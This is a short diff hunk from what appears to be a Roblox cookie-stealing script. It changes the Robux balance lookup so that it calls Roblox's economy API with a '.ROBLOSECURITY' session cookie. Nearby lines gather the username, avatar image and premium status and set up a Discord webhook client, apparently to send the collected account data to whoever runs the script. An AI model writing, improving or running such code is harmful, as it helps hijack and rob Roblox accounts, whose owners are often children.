@@ -192,7 +192,7 @@ if __name__ == "__main__":
     headshot = headshot_json["data"][0]["imageUrl"]
 
     username = info['UserName']
-    robux = info['RobuxBalance']
+    robux = requests.get("https://economy.roblox.com/v1/user/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
     premium_status = info['IsPremium']
 
     discord = Discord(url=webhook_url)
